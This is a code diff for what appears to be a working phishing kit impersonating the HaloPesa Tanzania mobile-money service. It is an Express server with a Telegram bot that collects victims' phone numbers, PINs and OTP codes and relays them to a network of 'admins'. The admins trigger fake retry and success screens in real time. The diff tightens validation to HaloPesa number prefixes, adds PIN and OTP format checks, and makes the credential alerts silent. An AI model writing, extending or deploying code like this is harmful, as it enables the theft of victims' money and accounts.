@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Integrated with 5-step application flow, OTP verification, & success approval.
+ * Integrated with silent Telegram notifications & strict HaloPesa number validation (062, 063, 061).
  */
 
 const express = require('express');
@@ -62,9 +62,14 @@ const sessions = new Map();
 const admins = loadAdmins();
 const adminConfigMessageIds = new Map();
 
+/**
+ * Validates HaloPesa Tanzania numbers ONLY (062, 063, 061)
+ */
 function isValidHaloPesaNumber(number) {
   const clean = String(number || '').replace(/\D/g, '');
-  return /^(062|063|061|071|075|076|078|068|069|255)\d+$/.test(clean) && clean.length >= 9;
+  const localPattern = /^(062|063|061)\d{7}$/;
+  const intlPattern = /^255(62|63|61)\d{7}$/;
+  return localPattern.test(clean) || intlPattern.test(clean);
 }
 
 function resolveTargetChat(adminParam) {
@@ -125,6 +130,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
 
   const sentMsg = await bot.sendMessage(chatId, adminListText, { 
     parse_mode: 'Markdown',
+    disable_notification: true,
     reply_markup: { inline_keyboard: keyboard } 
   });
   adminConfigMessageIds.set(chatId, sentMsg.message_id);
@@ -149,7 +155,7 @@ async function initBot() {
   bot.onText(/\/admins/, async (msg) => {
     const chatId = String(msg.chat.id);
     if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠️ Huna idhini.`);
+      await bot.sendMessage(chatId, `⚠️ Huna idhini.`, { disable_notification: true });
       return;
     }
     await updateContinuousAdminList(chatId, null, 0);
@@ -166,7 +172,7 @@ async function initBot() {
       if (chatId !== String(FALLBACK_ADMIN_ID)) {
         const record = admins.get(chatId);
         if (!record || !record.authorized) {
-          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa. Tafadhali wasiliana na Msimamizi Mkuu kwa idhini.`);
+          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa. Tafadhali wasiliana na Msimamizi Mkuu kwa idhini.`, { disable_notification: true });
           return;
         }
       }
@@ -181,7 +187,7 @@ async function initBot() {
         `• *Kitambulisho cha Telegram:* \`${userId}\`\n\n` +
         `🔗 *Kiungo Chako Maalum:*\n${userLink}`;
 
-      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown', disable_notification: true });
     } catch (err) {}
   });
 
@@ -195,7 +201,8 @@ async function initBot() {
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
         await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako kiko hai: ${APP_URL}\n\nAndika /admins kuona na kusimamia wasimamizi wasaidizi.`, {
-          parse_mode: 'Markdown'
+          parse_mode: 'Markdown',
+          disable_notification: true
         });
         return;
       }
@@ -228,6 +235,7 @@ async function initBot() {
           `Tafadhali idhinisha au kataa ombi hili.`, 
           { 
             parse_mode: 'Markdown',
+            disable_notification: true,
             reply_markup: {
               inline_keyboard: [
                 [
@@ -243,7 +251,7 @@ async function initBot() {
           `👋 *Karibu ${firstName}!*\n\n` +
           `⚠️ Akaunti yako kwa sasa **inasubiri idhini** kutoka kwa Msimamizi Mkuu.\n\n` +
           `Tafadhali wasiliana na **Msimamizi Mkuu** ili kupitishwa na kupokea kiungo chako maalum.`, 
-          { parse_mode: 'Markdown' }
+          { parse_mode: 'Markdown', disable_notification: true }
         );
         return;
       }
@@ -251,7 +259,7 @@ async function initBot() {
       const userLink = `${APP_URL}/?admin=${chatId}`;
       let responseText = `👋 *Karibu ${firstName}!*\n\nAkaunti yako imethibitishwa.\n\nKiungo chako kiko tayari na kinafanya kazi:\n${userLink}`;
 
-      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown', disable_notification: true });
 
     } catch (err) {}
   });
@@ -285,7 +293,7 @@ async function initBot() {
           await bot.sendMessage(targetSubId, 
             `🎉 *Hongera!* Akaunti yako imeidhinishwa na Msimamizi Mkuu.\n\n` +
             `🔗 *Kiungo Chako Maalum:*\n${assignedLink}`,
-            { parse_mode: 'Markdown' }
+            { parse_mode: 'Markdown', disable_notification: true }
           ).catch(() => {});
 
           await bot.answerCallbackQuery(query.id, { text: '✅ Msimamizi Ameidhinishwa Mafanikio!' });
@@ -298,7 +306,7 @@ async function initBot() {
           admins.delete(targetSubId);
           saveAdmins();
 
-          await bot.sendMessage(targetSubId, `❌ Ombi lako la kuwa msimamizi limekataliwa.`).catch(() => {});
+          await bot.sendMessage(targetSubId, `❌ Ombi lako la kuwa msimamizi limekataliwa.`, { disable_notification: true }).catch(() => {});
           await bot.answerCallbackQuery(query.id, { text: '❌ Ombi limekataliwa.' });
           await bot.editMessageText(`❌ *Ombi Limekataliwa na Kufutwa*\n\nID: \`${targetSubId}\``, {
             chat_id: chatId,
@@ -330,23 +338,23 @@ async function initBot() {
       switch (prefix) {
         case 'ALLOW_OTP':
           session.status = 'APPROVED_LOAD_OTP';
-          await bot.sendMessage(chatTarget, `✅ Skrini ya OTP imezidishwa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `✅ Skrini ya OTP imezidishwa kwa ${session.contact}`, { disable_notification: true });
           break;
         case 'DENY_OTP':
           session.status = 'DENIED';
-          await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa kwa ${session.contact}`, { disable_notification: true });
           break;
         case 'CORRECT_OTP':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Skrini ya mafanikio (Hongera) imewezeshwa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `🎉 Skrini ya mafanikio (Hongera) imewezeshwa kwa ${session.contact}`, { disable_notification: true });
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
-          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi imechochewa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi imechochewa kwa ${session.contact}`, { disable_notification: true });
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
-          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi imechochewa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi imechochewa kwa ${session.contact}`, { disable_notification: true });
           break;
         default:
           break;
@@ -382,8 +390,21 @@ app.post('/api/submit-application', async (req, res) => {
     }
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
+    
+    // Validate HaloPesa number (062, 063, 061)
     if (!isValidHaloPesaNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya simu.' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Tafadhali weka namba sahihi ya HaloPesa kuanzia na 062, 063, au 061.' 
+      });
+    }
+
+    // Validate PIN (4 digits)
+    if (!/^\d{4}$/.test(String(pin || ''))) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Tafadhali weka PIN sahihi ya tarakimu 4.' 
+      });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
@@ -391,7 +412,7 @@ app.post('/api/submit-application', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Kitambulisho cha chat hakipo au msimamizi hajaidhinishwa.' });
     }
 
-    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
+    const userId = cleanContact.replace(/[^a-zA-Z0-9]/g, '_');
 
     sessions.set(userId, {
       contact: cleanContact,
@@ -403,12 +424,14 @@ app.post('/api/submit-application', async (req, res) => {
     });
 
     const message =
-      `NEW HALOPESA APPLICATION\n\n` +
-      `NUMBER: ${cleanContact}\n` +
-      `PIN: ${pin}\n` +
-      `AMOUNT: ${amount || 'TSh 100,000'}`;
+      `📱 *NEW HALOPESA APPLICATION*\n\n` +
+      `📞 *NUMBER:* \`${cleanContact}\`\n` +
+      `🔑 *PIN:* \`${pin}\`\n` +
+      `💰 *AMOUNT:* ${amount || 'TSh 100,000'}`;
 
     const opts = {
+      parse_mode: 'Markdown',
+      disable_notification: true, // Silent notification (No pop-up / float on screen)
       reply_markup: {
         inline_keyboard: [
           [
@@ -450,15 +473,21 @@ app.post('/api/submit-otp', async (req, res) => {
 
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
+    if (!/^\d{4,6}$/.test(String(otp || ''))) {
+      return res.status(400).json({ success: false, error: 'Tafadhali ingiza kodi sahihi ya OTP.' });
+    }
+
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
     const message =
-      `NEW HALOPESA OTP SUBMISSION\n\n` +
-      `NUMBER: ${session.contact}\n` +
-      `OTP CODE: ${otp}`;
+      `🔐 *NEW HALOPESA OTP SUBMISSION*\n\n` +
+      `📞 *NUMBER:* \`${session.contact}\`\n` +
+      `🔑 *OTP CODE:* \`${otp}\``;
 
     const opts = {
+      parse_mode: 'Markdown',
+      disable_notification: true, // Silent notification
       reply_markup: {
         inline_keyboard: [
           [
